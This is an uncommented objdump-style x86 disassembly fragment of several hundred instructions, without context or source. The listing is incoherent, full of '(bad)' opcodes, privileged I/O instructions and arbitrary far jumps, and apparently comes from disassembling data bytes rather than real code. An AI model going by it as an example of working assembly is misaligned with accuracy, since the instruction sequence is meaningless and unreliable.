  41a59e:	mov    ?,WORD PTR [ebx+0x15]
  41a5a1:	push   ebx
  41a5a2:	loop   0x41a5ba
  41a5a4:	int3   
  41a5a5:	or     bl,BYTE PTR [ebx+0x64f8c8b0]
  41a5ab:	rcl    BYTE PTR [edi-0x6e0aae0b],0x9d
  41a5b2:	test   BYTE PTR [ecx-0x65],bl
  41a5b5:	pushf  
  41a5b6:	pop    edi
  41a5b7:	pop    ebx
  41a5b8:	out    dx,eax
  41a5b9:	mov    ch,0xba
  41a5bb:	pop    ds
  41a5bc:	stos   BYTE PTR es:[edi],al
  41a5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5be:	dec    edx
  41a5bf:	mov    eax,ds:0xb685d2a
  41a5c4:	test   al,0x62
  41a5c6:	sbb    al,0xc9
  41a5c8:	int    0x33
  41a5ca:	mov    ds:0x337633d1,eax
  41a5cf:	imul   esp,DWORD PTR [eiz*8+0x18745712],0xffffff86
  41a5d7:	es sbb ebx,ebp
  41a5da:	inc    esp
  41a5db:	push   ebx
  41a5dc:	add    eax,0x51111277
  41a5e1:	or     dl,dh
  41a5e3:	loop   0x41a61b
  41a5e5:	jb     0x41a5e5
  41a5e7:	imul   edi,DWORD PTR [ebx+0x3453f712],0xffffffd4
  41a5ee:	dec    ebx
  41a5ef:	cmp    al,0x5f
  41a5f1:	mov    ebp,0x3736c31e
  41a5f6:	popf   
  41a5f7:	ret    
  41a5f8:	fist   DWORD PTR [ecx-0x3d54aa0f]
  41a5fe:	push   ds
  41a5ff:	and    dh,bh
  41a601:	mov    DWORD PTR ds:0xbec8d389,esi
  41a607:	ret    0x393
  41a60a:	mov    dl,0xe4
  41a60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a60d:	popa   
  41a60e:	mov    al,0xa
  41a610:	jmp    0x147c:0x3e64ef4
  41a617:	(bad)  
  41a618:	cmp    edi,edi
  41a61a:	loope  0x41a622
  41a61c:	test   eax,0x69042f9a
  41a621:	hlt    
  41a622:	mov    esi,edi
  41a624:	xchg   edx,eax
  41a625:	mov    ebp,0x8a64febd
  41a62a:	repnz dec ecx
  41a62c:	or     ecx,DWORD PTR [ecx-0x7]
  41a62f:	push   ebp
  41a630:	xor    DWORD PTR [ebx],eax
  41a632:	ret    0x2a6c
  41a635:	mov    WORD PTR ds:0xe76a4145,?
  41a63b:	aad    0x0
  41a63d:	scas   eax,DWORD PTR es:[edi]
  41a63e:	push   esi
  41a63f:	jle    0x41a695
  41a641:	add    eax,0xfd318f4d
  41a646:	loopne 0x41a6a1
  41a648:	jg     0x41a610
  41a64a:	lds    ecx,FWORD PTR [esi-0x4ee5c6f2]
  41a650:	jge    0x41a5f3
  41a652:	jge    0x41a5fe
  41a654:	iret   
  41a655:	dec    esi
  41a656:	xor    DWORD PTR es:[edi+0x7e],0xffffff96
  41a65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a65c:	push   ss
  41a65d:	out    0x1c,al
  41a65f:	mov    WORD PTR [esi-0x2aefcbc0],cs
  41a665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a667:	test   al,0x33
  41a669:	pusha  
  41a66a:	(bad)  
  41a66b:	mov    al,ds:0x44350294
  41a670:	or     al,0xb3
  41a672:	lahf   
  41a673:	cmp    eax,0xb89a0588
  41a678:	add    al,0x73
  41a67a:	jl     0x41a60c
  41a67c:	shr    DWORD PTR [ecx+0x7],cl
  41a67f:	and    esi,DWORD PTR [edx-0x27]
  41a682:	(bad)  
  41a683:	jge    0x41a6cc
  41a685:	mov    ds:0xd5eb1553,eax
  41a68a:	sub    DWORD PTR [ebx],0xffffff86
  41a68d:	and    BYTE PTR [eax],bl
  41a68f:	push   ds
  41a690:	mov    al,ds:0xcd64673d
  41a695:	lahf   
  41a696:	retf   
  41a697:	push   0x15
  41a699:	sbb    ecx,DWORD PTR [eax]
  41a69b:	mov    ah,0x7b
  41a69d:	inc    edi
  41a69e:	cwde   
  41a69f:	sub    DWORD PTR [ecx],ebx
  41a6a1:	jle    0x41a691
  41a6a3:	xchg   edx,eax
  41a6a4:	sbb    al,0x7d
  41a6a6:	(bad)  
  41a6a8:	fwait
  41a6a9:	inc    BYTE PTR [ebp+eax*4-0x1f6dcb4d]
  41a6b0:	lahf   
  41a6b1:	push   si
  41a6b3:	retf   
  41a6b4:	mov    ds:0x71af33cb,eax
  41a6b9:	jmp    0x41a736
  41a6bb:	sub    al,0xf0
  41a6bd:	mov    ds:0xe3056788,eax
  41a6c2:	adc    bl,cl
  41a6c4:	mov    cl,BYTE PTR [edx]
  41a6c6:	mov    eax,ds:0xf18a2ae
  41a6cb:	mov    bl,0x2e
  41a6cd:	arpl   WORD PTR [ecx-0x2dbeed43],si
  41a6d3:	das    
  41a6d4:	std    
  41a6d5:	sub    al,BYTE PTR [ebx]
  41a6d7:	je     0x41a6cd
  41a6d9:	dec    esi
  41a6da:	mov    ecx,0xaafafbd2
  41a6df:	arpl   WORD PTR [edx+0x1448c245],dx
  41a6e5:	(bad)  
  41a6e6:	stc    
  41a6e7:	pop    esp
  41a6e8:	int3   
  41a6e9:	add    eax,0xadd0007
  41a6ee:	add    BYTE PTR ds:0x97d28b4e,ch
  41a6f4:	lods   eax,DWORD PTR ds:[esi]
  41a6f5:	push   cs
  41a6f6:	inc    ecx
  41a6f7:	jne    0x41a6a4
  41a6f9:	or     esp,DWORD PTR [edx-0x6f306ac7]
  41a6ff:	test   eax,0x333d0dcb
  41a704:	xchg   BYTE PTR [ebp+0x42],dl
  41a707:	out    dx,eax
  41a708:	xor    eax,0xd82c9fb2
  41a70d:	loopne 0x41a767
  41a70f:	jg     0x41a725
  41a711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a712:	jae    0x41a69e
  41a714:	sti    
  41a715:	or     eax,0xeabe3843
  41a71a:	popa   
  41a71b:	scas   al,BYTE PTR es:[edi]
  41a71c:	push   esi
  41a71d:	add    al,0x81
  41a71f:	gs xchg ebx,eax
  41a721:	sbb    BYTE PTR [ebp+0x6ef8d3d1],al
  41a727:	ret    
  41a728:	sub    eax,0xe64dd876
  41a72d:	add    BYTE PTR [ebx+0x38005497],0x9a
  41a734:	or     DWORD PTR [ebx-0x30],esi
  41a737:	sbb    eax,DWORD PTR [edx]
  41a739:	mov    ds:0x79ebda92,eax
  41a73e:	stc    
  41a73f:	dec    eax
  41a740:	(bad)  
  41a741:	pop    eax
  41a742:	leave  
  41a743:	shl    BYTE PTR [edx+0x4f69d36d],1
  41a749:	stos   DWORD PTR es:[edi],eax
  41a74a:	fdecstp 
  41a74c:	fs clc 
  41a74e:	gs je  0x41a764
  41a751:	jnp    0x41a70f
  41a753:	popa   
  41a754:	pop    esi
  41a755:	aaa    
  41a756:	sub    al,0xed
  41a758:	sub    eax,0x85b9a928
  41a75d:	pushf  
  41a75e:	push   esi
  41a75f:	push   cs
  41a760:	mov    ds,WORD PTR [ebx+0x6e]
  41a763:	inc    eax
  41a764:	pop    eax
  41a765:	test   edx,esi
  41a767:	dec    ebp
  41a768:	ficomp DWORD PTR [edi]
  41a76a:	(bad)  
  41a76b:	(bad)  
  41a76c:	mov    BYTE PTR [ebp-0x35f6581],bl
  41a772:	lock push 0xa7bed4ef
  41a778:	xor    eax,0x4c582f48
  41a77d:	mov    DWORD PTR [ecx+0x3],esi
  41a780:	cdq    
  41a781:	out    dx,al
  41a782:	lahf   
  41a783:	leave  
  41a784:	cmp    cl,BYTE PTR [eax+0x4fd2a379]
  41a78a:	dec    ebp
  41a78b:	jmp    0x5b4f03d4
  41a790:	push   0xfffffffb
  41a792:	sub    eax,0xf9653523
  41a797:	lods   eax,DWORD PTR ds:[esi]
  41a798:	adc    dh,BYTE PTR [ecx]
  41a79a:	cmp    DWORD PTR [esi],edi
  41a79c:	jp     0x41a7e4
  41a79e:	cmp    edi,DWORD PTR [eax-0x52]
  41a7a1:	pop    ebp
  41a7a2:	inc    esp
  41a7a3:	lahf   
  41a7a4:	retf   
  41a7a5:	jge    0x41a78e
  41a7a7:	daa    
  41a7a8:	mov    al,ds:0x3304781b
  41a7ad:	mov    eax,0x98d0f667
  41a7b2:	adc    ebx,ebx
  41a7b4:	(bad)  
  41a7b5:	mov    esp,0x68221656
  41a7ba:	or     edi,0x69efecc
  41a7c0:	sub    al,0xa5
  41a7c2:	add    al,0xdd
  41a7c4:	dec    edx
  41a7c5:	or     BYTE PTR [esi],0xe0
  41a7c8:	mov    BYTE PTR [eax-0x28],cl
  41a7cb:	aas    
  41a7cc:	pop    edi
  41a7cd:	or     BYTE PTR [ebx+0x6dbcf800],ah
  41a7d3:	mov    al,BYTE PTR [ebp-0x1a]
  41a7d6:	push   es
  41a7d7:	das    
  41a7d8:	fdivrp st(7),st
  41a7da:	jnp    0x41a7b7
  41a7dc:	out    0xa1,al
  41a7de:	adc    DWORD PTR [esi+ebx*4+0x46697082],ebx
  41a7e5:	pop    ebx
  41a7e6:	cmc    
  41a7e7:	dec    edi
  41a7e8:	jp     0x41a846
  41a7ea:	pop    ecx
  41a7eb:	ror    DWORD PTR [edi],0xbf
  41a7ee:	out    0xef,eax
  41a7f0:	mov    es,esp
  41a7f2:	xor    DWORD PTR ds:0x27d801ef,0xffffffde
  41a7f9:	pop    esi
  41a7fa:	aaa    
  41a7fb:	jne    0x41a849
  41a7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7fe:	imul   eax,DWORD PTR [ebx-0x4e],0x4424a61c
  41a805:	xor    BYTE PTR [eax+0x1ba49efd],ch
  41a80b:	cmovae ecx,DWORD PTR [ebx]
  41a80e:	daa    
  41a80f:	sub    al,0x9e
  41a811:	mov    esp,0x97d4a4c7
  41a816:	adc    al,0xb7
  41a818:	xor    ebx,DWORD PTR [eax-0x14]
  41a81b:	xor    esi,ebx
  41a81d:	add    cl,BYTE PTR [eax]
  41a81f:	mov    BYTE PTR fs:[ebp-0x30],bh
  41a823:	xchg   BYTE PTR [ecx+0x12474498],bh
  41a829:	(bad)  
  41a82a:	xlat   BYTE PTR ds:[ebx]
  41a82b:	push   ebp
  41a82c:	test   eax,0x6332bc39
  41a831:	inc    ebp
  41a832:	test   ecx,edi
  41a834:	popa   
  41a835:	fsub   QWORD PTR [ecx]
  41a837:	arpl   cx,ax
  41a839:	ja     0x41a83e
  41a83b:	adc    bl,BYTE PTR [ebx+0x77]
  41a83e:	push   ecx
  41a83f:	cmp    eax,0x8b5af1d7
  41a844:	aaa    
  41a845:	test   eax,0xd84b7261
  41a84a:	es mov edi,0x27b7b4b8
  41a850:	adc    eax,0x517cbedc
  41a855:	imul   esi,ebx,0xffffff94
  41a858:	xlat   BYTE PTR ds:[ebx]
  41a859:	jb     0x41a7f0
  41a85b:	(bad)  
  41a85c:	jp     0x41a838
  41a85e:	jnp    0x41a854
  41a860:	addps  xmm7,XMMWORD PTR [esi-0xc]
  41a864:	mov    bh,BYTE PTR [edx-0x41]
  41a867:	jmp    0x536c:0xa780ef80
  41a86e:	mov    ds:0x36d9f808,al
  41a873:	add    eax,0x39ff895f
  41a878:	push   ecx
  41a879:	scas   al,BYTE PTR es:[edi]
  41a87a:	loope  0x41a84b
  41a87c:	mov    dh,0xbe
  41a87e:	sub    ebp,DWORD PTR [esi+0x41fa9ade]
  41a884:	aas    
  41a885:	stos   DWORD PTR es:[edi],eax
  41a886:	pop    esi
  41a887:	push   ebp
  41a888:	sahf   
  41a889:	push   eax
  41a88a:	in     al,0x51
  41a88c:	xor    DWORD PTR [eax],ebx
  41a88e:	popf   
  41a88f:	cmc    
  41a890:	mov    edi,0x95cb8fcf
  41a895:	cli    
  41a896:	ins    BYTE PTR es:[edi],dx
  41a897:	lds    edx,FWORD PTR [ecx+0x21]
  41a89a:	jmp    0x41a867
  41a89c:	out    dx,al
  41a89d:	and    al,BYTE PTR [ebx+0x5d]
  41a8a0:	sub    eax,0xe8668f6b
  41a8a5:	hlt    
  41a8a6:	sbb    eax,0x2150fed0
  41a8ab:	cld    
  41a8ac:	dec    edi
  41a8ad:	mov    esi,0x9eeac391
  41a8b2:	gs push edi
  41a8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b5:	int    0xb9
  41a8b7:	mov    dl,0x1b
  41a8b9:	ja     0x41a842
  41a8bb:	scas   eax,DWORD PTR es:[edi]
  41a8bc:	mov    ds:0xcf8f7ae5,al
  41a8c1:	fistp  DWORD PTR [esi+0x54]
  41a8c4:	loopne 0x41a874
  41a8c6:	ror    ebx,1
  41a8c8:	out    dx,eax
  41a8c9:	cmc    
  41a8ca:	ds dec esp
  41a8cc:	mov    eax,ds:0xc9d39f18
  41a8d1:	sbb    eax,edi
  41a8d3:	adc    DWORD PTR [ebx+0x0],eax
  41a8d6:	cmp    bh,BYTE PTR [eax+0x54fe5aa1]
  41a8dc:	push   esp
  41a8dd:	pop    eax
  41a8de:	cmc    
  41a8df:	push   DWORD PTR ds:0xa603406
  41a8e5:	popa   
  41a8e6:	test   BYTE PTR [edx],cl
  41a8e8:	inc    esp
  41a8e9:	js     0x41a968
  41a8eb:	xchg   edi,eax
  41a8ec:	dec    ebp
  41a8ee:	stc    
  41a8ef:	fstp   TBYTE PTR ds:0x1473759b
  41a8f5:	inc    ebx
  41a8f6:	fistp  QWORD PTR [esi-0x72055721]
  41a8fc:	dec    eax
  41a8fd:	clc    
  41a8fe:	ja     0x41a8ba
  41a900:	rol    DWORD PTR [eax-0x732975b6],0xa8
  41a907:	mov    eax,0x7056d230
  41a90c:	mov    dh,BYTE PTR [ebx]
  41a90e:	mov    dl,0x1c
  41a910:	outs   dx,DWORD PTR ds:[esi]
  41a911:	jp     0x41a976
  41a913:	das    
  41a914:	mov    ch,0x56
  41a916:	das    
  41a917:	popa   
  41a918:	(bad)  
  41a919:	(bad)  
  41a91a:	pop    esp
  41a91b:	(bad)  
  41a91c:	test   ebp,0xae02cdb
  41a922:	std    
  41a923:	scas   al,BYTE PTR es:[edi]
  41a924:	mov    esi,esi
  41a926:	push   ds
  41a927:	push   edx
  41a928:	jmp    0x8ed1bdda
  41a92d:	mov    ah,0xb4
  41a92f:	int    0x1a
  41a931:	cmp    eax,0xc2b08387
  41a936:	inc    esi
  41a937:	or     al,0xb7
  41a939:	push   0x52
  41a93b:	pop    esp
  41a93c:	jb     0x41a8de
  41a93e:	push   es
  41a93f:	(bad)  
  41a940:	enter  0x8a1f,0xa2
  41a944:	call   0xc7ba:0xd54b8203
  41a94b:	arpl   WORD PTR [eax+0x7554a37e],ax
  41a951:	jb     0x41a9b5
  41a953:	retf   0x3c12
  41a956:	inc    edx
  41a957:	push   ds
  41a958:	lods   eax,DWORD PTR ds:[esi]
  41a959:	mov    bl,0x1e
  41a95b:	xor    cl,BYTE PTR [ecx-0x78]
  41a95e:	or     ah,al
  41a960:	imul   edx,DWORD PTR [esi-0x2c3202f9],0xcf402139
  41a96a:	jecxz  0x41a934
  41a96c:	adc    al,0x59
  41a96e:	lahf   
  41a96f:	call   0xcb3f661b
  41a974:	ja     0x41a99d
  41a976:	hlt    
  41a977:	mov    edi,0x4255c64d
  41a97c:	rcl    BYTE PTR [edx+0x7a7a7e34],0x28
  41a983:	push   ecx
  41a984:	xchg   ebx,eax
  41a985:	dec    ecx
  41a986:	adc    bl,BYTE PTR [edi-0xa027a3e]
  41a98c:	mov    ch,0xf1
  41a98e:	jno    0x41a937
  41a990:	mov    ?,edi
  41a992:	fmul   st(3),st
  41a994:	mov    bh,0x98
  41a996:	push   0x79
  41a998:	in     eax,dx
  41a999:	lahf   
  41a99a:	sub    al,ah
  41a99c:	adc    eax,0x10b0363d
  41a9a1:	rol    BYTE PTR [eax-0x1d],cl
  41a9a4:	push   edi
  41a9a5:	fcmovnbe st,st(0)
  41a9a7:	mov    WORD PTR [edx-0x7f],?
  41a9aa:	and    ah,0x5f
  41a9ad:	ds ret 0x137b
  41a9b1:	out    dx,al
  41a9b2:	(bad)  
  41a9b3:	clc    
  41a9b4:	jne    0x41a94c
  41a9b6:	scas   al,BYTE PTR es:[edi]
  41a9b7:	into   
  41a9b8:	adc    DWORD PTR ds:0xd0ca6b5f,edx
  41a9be:	and    DWORD PTR [ebx],edx
  41a9c0:	sbb    eax,0x5f5a72a
  41a9c5:	test   BYTE PTR [ebx-0x69bb7e25],al
  41a9cb:	mov    esp,0x1423f44d
  41a9d0:	stos   BYTE PTR es:[edi],al
  41a9d1:	cmp    eax,0x10cbe20d
  41a9d6:	cmp    dl,ch
  41a9d8:	mov    edx,0x589f3381
  41a9dd:	ret    
  41a9de:	fdivr  QWORD PTR [edx+0x5348444d]
  41a9e4:	aam    0xc5
  41a9e6:	mov    ah,BYTE PTR [ebx+edi*1+0x65127de0]
  41a9ed:	lods   al,BYTE PTR ds:[esi]
  41a9ee:	add    bl,dh
  41a9f0:	pop    ebx
  41a9f1:	push   ss
  41a9f2:	add    eax,0xa3f0c8d8
  41a9f7:	jnp    0x41a9c9
  41a9f9:	dec    eax
  41a9fa:	mov    ah,0x1a
  41a9fc:	lds    ebp,FWORD PTR [edi-0x64]
  41a9ff:	in     al,0x0
  41aa01:	and    cl,ah
  41aa03:	imul   edi,DWORD PTR ds:0xe24bb2a2,0xf5199290
  41aa0d:	push   0x9b3d8f3d
  41aa12:	mov    al,BYTE PTR [ebx+0x7c]
  41aa15:	push   0x58ab0619
  41aa1a:	mov    dl,dh
  41aa1c:	dec    esi
  41aa1d:	adc    cl,BYTE PTR [ebx]
  41aa1f:	push   0xae679c08
  41aa24:	push   ecx
  41aa25:	mov    dl,0x1d
  41aa27:	pop    esi
  41aa28:	(bad)  
  41aa29:	push   esi
  41aa2a:	ror    DWORD PTR ds:0x9ae47fc9,1
  41aa30:	push   0xa96510b3
  41aa35:	rcr    DWORD PTR [esi],0x11
  41aa38:	cmp    BYTE PTR [ebx-0x77],0xac
  41aa3c:	xor    DWORD PTR [edx],ecx
  41aa3e:	adc    DWORD PTR [edi],ecx
  41aa40:	and    BYTE PTR [ebx+0x555aae4a],dl
  41aa46:	jae    0x41aa22
  41aa48:	dec    edi
  41aa49:	ret    0x4d77
  41aa4c:	mov    dl,BYTE PTR [ebp-0x5e]
  41aa4f:	data16 clc 
  41aa51:	hlt    
  41aa52:	ret    0xaad9
  41aa55:	push   ebp
  41aa56:	add    eax,DWORD PTR ds:0x6229f863
  41aa5c:	shr    DWORD PTR [edx+eiz*2-0x5d],0xeb
  41aa61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa62:	ss and al,0xf0
  41aa65:	dec    esi
  41aa66:	push   ebx
  41aa67:	or     DWORD PTR [ebp+eiz*2+0x6778cf61],0xffffffc6
  41aa6f:	in     al,dx
  41aa70:	jg     0x41aab8
  41aa72:	mul    DWORD PTR [eax-0x2b5aef76]
  41aa78:	push   edx
  41aa79:	gs mov ebp,edi
  41aa7c:	sub    bh,ah
  41aa7e:	and    BYTE PTR [edi+ebx*4-0x4e],al
  41aa82:	push   ds
  41aa83:	jo     0x41aaea
  41aa85:	pop    es
  41aa86:	jle    0x41aafd
  41aa88:	jl     0x41ab01
  41aa8a:	(bad)  
  41aa8b:	jmp    0x94a8:0xd1a9761b
  41aa92:	out    dx,eax
  41aa93:	xor    ecx,DWORD PTR [ebx-0x7661a3e1]
  41aa99:	sub    ch,BYTE PTR [esi]
  41aa9b:	adc    ebp,DWORD PTR [ecx+0x38]
  41aa9e:	pop    ds
  41aa9f:	inc    esp
  41aaa0:	js     0x41ab13
  41aaa2:	inc    eax
  41aaa3:	mov    cs,WORD PTR [edx+0x128a3ed8]
  41aaa9:	push   ebp
  41aaaa:	sti    
  41aaab:	mov    cl,0x5a
  41aaad:	call   0xf876db40
  41aab2:	push   edx
  41aab3:	ins    BYTE PTR es:[edi],dx
  41aab4:	sub    al,0xbc
  41aab6:	add    DWORD PTR [eax+0x22],ebp
  41aab9:	xor    eax,0x83868f4f
  41aabe:	ret    
  41aabf:	or     DWORD PTR [ebx],edi
  41aac1:	retf   0x90f6
  41aac4:	fidivr WORD PTR [edi+0x621d20ff]
  41aaca:	jmp    FWORD PTR ds:[ecx]
  41aacd:	inc    esp
  41aace:	outs   dx,BYTE PTR ds:[esi]
  41aacf:	inc    ebx
  41aad0:	jp     0x41ab1a
  41aad2:	mov    eax,ds:0x2596e827
  41aad7:	mov    ebx,0xc1e211a8
  41aadc:	test   al,0x25
  41aade:	cmp    eax,0x855e95b6
  41aae3:	mov    WORD PTR [ebx-0x78],gs
  41aae6:	popa   
  41aae7:	push   esp
  41aae8:	or     al,0xcb
  41aaea:	cwde   
  41aaeb:	push   esi
  41aaec:	mov    ebp,0xf544146d
  41aaf1:	pushf  
  41aaf2:	push   edx
  41aaf3:	sub    edx,DWORD PTR [ecx+0x4e0c78c]
  41aaf9:	inc    ecx
  41aafa:	jo     0x41aad2
  41aafc:	das    
  41aafd:	into   
  41aafe:	outs   dx,DWORD PTR ds:[esi]
  41aaff:	(bad)  
  41ab01:	into   
  41ab02:	add    al,0x87
  41ab04:	aas    
  41ab05:	push   es
  41ab06:	xor    al,0xc2
  41ab08:	lods   eax,DWORD PTR ds:[esi]
  41ab09:	mov    ecx,0x37212651
  41ab0e:	xchg   ecx,edi
  41ab10:	loopne 0x41aaa9
  41ab12:	mov    WORD PTR [ecx-0x25],gs
  41ab15:	sub    bl,BYTE PTR [ebx-0x4da0870d]
  41ab1b:	imul   ecx,DWORD PTR [esi+eiz*2-0x4e201904],0x84649469
  41ab26:	fisttp QWORD PTR [eax]
  41ab28:	dec    ecx
  41ab29:	add    ecx,DWORD PTR [edx-0x43]
  41ab2c:	cmp    DWORD PTR [eax-0xb73dc0c],esp
  41ab32:	leave  
  41ab33:	push   ebx
  41ab34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab36:	adc    ebp,DWORD PTR [ebx-0xe9ae5ec]
  41ab3c:	inc    esp
  41ab3d:	lds    esi,FWORD PTR [ecx-0x75]
  41ab40:	(bad)  
  41ab41:	les    ebp,FWORD PTR [ecx]
  41ab43:	xchg   ebx,eax
  41ab44:	cmp    BYTE PTR [esi],bl
  41ab46:	cmp    BYTE PTR [edi-0x61],al
  41ab49:	mov    bl,cl
  41ab4b:	push   esp
  41ab4c:	inc    esi
  41ab4d:	sbb    eax,0x1f4de0e
  41ab52:	jmp    0x41ab4e
  41ab54:	nop
  41ab55:	push   es
  41ab56:	sub    al,0x14
  41ab58:	jge    0x41ab6d
  41ab5a:	sbb    esi,ebp
  41ab5c:	inc    edx
  41ab5d:	call   0x1ee67fab
  41ab62:	fadd   st,st(4)
  41ab64:	jne    0x41ab8e
  41ab66:	loope  0x41ab70
  41ab68:	xchg   ebp,eax
  41ab69:	dec    ebp
  41ab6a:	or     al,0x7
  41ab6c:	xor    DWORD PTR [eax-0x41a59af9],0x50
  41ab73:	retf   0x7903
  41ab76:	inc    BYTE PTR [eax-0x28]
  41ab79:	out    dx,eax
  41ab7a:	jno    0x41ab8d
  41ab7c:	(bad)  
  41ab7d:	sbb    al,0x18
  41ab7f:	mov    bh,bl
  41ab81:	aam    0x3d
  41ab83:	sub    cl,dh
  41ab85:	mov    ds:0x6d91da1,al
  41ab8a:	stos   BYTE PTR es:[edi],al
  41ab8b:	add    DWORD PTR [esi],ebp
  41ab8d:	int3   
  41ab8e:	jns    0x41abf2
  41ab90:	inc    edi
  41ab91:	les    ebx,FWORD PTR [ecx]
  41ab93:	add    ecx,DWORD PTR [edi-0x12]
  41ab96:	nop
  41ab97:	add    ch,cl
  41ab99:	pop    edx
  41ab9a:	mov    BYTE PTR [edx],0xd9
  41ab9d:	jb     0x41ab9e
  41ab9f:	or     BYTE PTR [eax-0x64],cl
  41aba2:	stos   DWORD PTR es:[edi],eax
  41aba3:	pop    edi
  41aba4:	sub    ebp,esp
  41aba6:	mov    edi,0x7d47184b
  41abab:	icebp  
  41abac:	aaa    
  41abad:	fdivr  QWORD PTR ss:[esi-0x42]
  41abb1:	fmul   QWORD PTR [esi]
  41abb3:	fstp   TBYTE PTR [edi+edi*4-0x11ccd947]
  41abba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abbb:	in     eax,0xfd
  41abbd:	cdq    
  41abbe:	es jge 0x41ab92
  41abc1:	adc    eax,0xbdd253be
  41abc6:	sahf   
  41abc7:	sbb    dl,0xa7
  41abca:	dec    esi
  41abcb:	ds (bad) 
  41abcd:	adc    ebx,DWORD PTR [edi-0x80]
  41abd0:	push   ecx
  41abd1:	adc    al,BYTE PTR [esp+edx*4]
  41abd4:	push   ebp
  41abd5:	and    eax,0x9a4af003
  41abda:	in     eax,0xbd
  41abdc:	xor    esp,DWORD PTR [eax+0x16]
  41abdf:	das    
  41abe0:	pop    ds
  41abe1:	les    esi,FWORD PTR [eax+eiz*1-0x4d]
  41abe5:	cli    
  41abe6:	(bad)  
  41abe7:	jp     0x41ac34
  41abe9:	cli    
  41abea:	mov    esi,0x44f672ff
  41abef:	jbe    0x41abaf
  41abf1:	stos   DWORD PTR es:[edi],eax
  41abf2:	int    0xd
  41abf4:	and    eax,0xd6a779be
  41abf9:	clc    
  41abfa:	jnp    0x41abfd
  41abfc:	jmp    0xa131:0xfd430d31
  41ac03:	aaa    
  41ac04:	sbb    al,0xce
  41ac06:	bnd jge 0x41ac3f
  41ac09:	lods   eax,DWORD PTR ds:[esi]
  41ac0a:	aam    0x28
  41ac0c:	jne    0x41ac42
  41ac0e:	js     0x41ac0a
  41ac10:	xchg   BYTE PTR [edx],dh
  41ac12:	(bad)  
  41ac13:	out    0x2f,al
  41ac15:	mov    esi,0x7d2d68a4
  41ac1a:	adc    esi,DWORD PTR [ebp+0x8eb7e8b]
  41ac20:	lahf   
  41ac21:	mov    bl,0x8f
  41ac23:	sub    eax,0x1cf4a219
  41ac28:	rol    BYTE PTR [eax],0x58
  41ac2b:	mov    al,0x29
  41ac2d:	mov    ah,0xab
  41ac2f:	mov    al,0xc4
  41ac31:	rcl    BYTE PTR [edi],0x90
  41ac34:	fisubr DWORD PTR [eax-0x5d]
  41ac37:	cdq    
  41ac38:	in     al,dx
  41ac39:	jae    0x41ac87
  41ac3b:	jne    0x41abd4
  41ac3d:	outs   dx,BYTE PTR ds:[esi]
  41ac3e:	sub    cl,BYTE PTR [edx+0x72de19c5]
  41ac44:	in     al,0x87
  41ac46:	pop    ebx
  41ac47:	jne    0x41acbe
  41ac49:	sahf   
  41ac4a:	jle    0x41ac8a
  41ac4c:	rcr    DWORD PTR [eax+ecx*8],1
  41ac4f:	in     al,0x16
  41ac51:	xor    dh,BYTE PTR [esi-0x79490fae]
  41ac57:	dec    ecx
  41ac58:	stos   DWORD PTR es:[edi],eax
  41ac59:	jae    0x41ac3d
  41ac5b:	cld    
  41ac5c:	xor    BYTE PTR [edi+0x2f56ae81],ah
  41ac62:	pop    esi
  41ac63:	push   ecx
  41ac64:	push   0x30e6bc27
  41ac69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac6a:	hlt    
  41ac6b:	icebp  
  41ac6c:	xchg   ecx,eax
  41ac6d:	loope  0x41acb7
  41ac6f:	sahf   
  41ac70:	add    DWORD PTR [ecx-0xa],edi
  41ac73:	pop    esi
  41ac74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac75:	retf   
  41ac76:	test   dl,dh
  41ac78:	inc    ebp
  41ac79:	xchg   ecx,eax
  41ac7a:	pop    esp
  41ac7b:	into   
  41ac7c:	test   ecx,ecx
  41ac7e:	dec    edi
  41ac7f:	clc    
  41ac80:	test   DWORD PTR [edx+0x72],ecx
  41ac83:	xor    DWORD PTR [eax+0x11],esi
  41ac86:	fwait
  41ac87:	(bad)  
  41ac88:	jmp    0x41ac77
  41ac8a:	xchg   ebp,eax
  41ac8b:	cmp    eax,0xb6ef96cf
  41ac90:	rcl    DWORD PTR [eax-0x46c9be68],0x6c
  41ac97:	sub    DWORD PTR [edi],eax
  41ac99:	lods   al,BYTE PTR ds:[esi]
  41ac9a:	fwait
  41ac9b:	in     al,0xf6
  41ac9d:	push   esp
  41ac9e:	cli    
  41ac9f:	pop    esi
  41aca0:	lods   eax,DWORD PTR ds:[esi]
  41aca1:	mov    eax,ds:0x8b3d3836
  41aca6:	mov    bh,BYTE PTR [eax+0x6f68ef1a]
  41acac:	(bad)  
  41acad:	call   0x9794c508
  41acb2:	popf   
  41acb3:	test   BYTE PTR gs:[eax+esi*4-0x2],ah
  41acb8:	(bad)  
  41acb9:	jmp    0x41acc9
  41acbb:	hlt    
  41acbc:	xchg   ecx,eax
  41acbd:	dec    ebp
  41acbe:	rcr    WORD PTR [ebx],0x89
  41acc2:	call   0x231e:0x5fd3999e
  41acc9:	push   eax
  41acca:	pop    es
  41accb:	cmp    eax,0x126ebee7
  41acd0:	mov    esp,0xeb218a51
  41acd5:	addr16 fwait
  41acd7:	repz rcl bh,1
  41acda:	pop    esp
  41acdb:	(bad)  
  41acdc:	lahf   
  41acdd:	push   ebp
  41acde:	out    dx,al
  41acdf:	pop    ebx
  41ace0:	retf   
  41ace1:	jecxz  0x41acfc
  41ace3:	lds    esi,FWORD PTR [eax-0x65]
  41ace6:	add    edi,DWORD PTR [edi]
  41ace8:	inc    esi
  41ace9:	push   eax
  41acea:	mov    al,al
  41acec:	in     eax,dx
  41aced:	add    DWORD PTR [edx+0x369c5c39],esp
  41acf3:	pop    ecx
  41acf4:	sbb    edi,0xc521c7bf
  41acfa:	out    dx,eax
  41acfb:	ret    0xa667
  41acfe:	dec    eax
  41acff:	inc    eax
  41ad00:	in     eax,0x32
  41ad02:	popf   
  41ad03:	or     bh,BYTE PTR [edx]
